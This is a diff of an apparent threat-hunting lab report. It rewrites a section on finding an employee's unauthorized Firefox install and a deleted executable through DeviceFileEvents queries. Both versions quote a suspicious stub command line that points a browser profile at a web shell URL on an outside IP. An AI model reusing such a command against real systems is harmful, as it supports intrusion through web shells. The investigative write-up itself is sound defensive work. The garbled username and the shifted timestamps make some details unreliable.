@@ -31,12 +31,11 @@ This behavior strongly indicates unauthorized browser installation and potential
 
 ### 1. Searched the `DeviceFileEvents` Table
 
-Initial query revealed that employee0 executed a Firefox installer from their Downloads directory, which created temporary folders named Temp and MalProfile, later deleted.
-Evidence revealed a deleted executable:
-`C:\Program Files\Mozilla Firefox\firefox.exe`
-The deletion occurred at `2025-10-12 01:55:24 AM`, immediately after execution by user employee0.
+I began by querying the `DeviceFileEvents` table to identify suspicious Firefox-related file operations by employee0. The initial query revealed that employee0 downloaded a legitimate Firefox installer at `2025-10-12T04:29:57Z` from Mozilla's official CDN to their Downloads directory.
 
-The initiating process was a suspicious stub: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php`
+As I continued analyzing the file events, I discovered critical evidence of a deleted executable: `C:\Program Files\Mozilla Firefox\firefox.exe.`The deletion occurred at `2025-10-12T05:55:24Z`, which immediately raised suspicions. The initiating process responsible for this deletion was a suspicious stub: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php`. 
+
+This command line was particularly alarming because it contained a direct HTTP reference to `/admin/shell.php`, strongly indicating web shell activity. Additionally, I noticed the creation and subsequent deletion of temporary folders named `Temp` and `MalProfile` in the Downloads directory, suggesting an attempt to cover tracks.
 
 **Query used to locate events:**
 
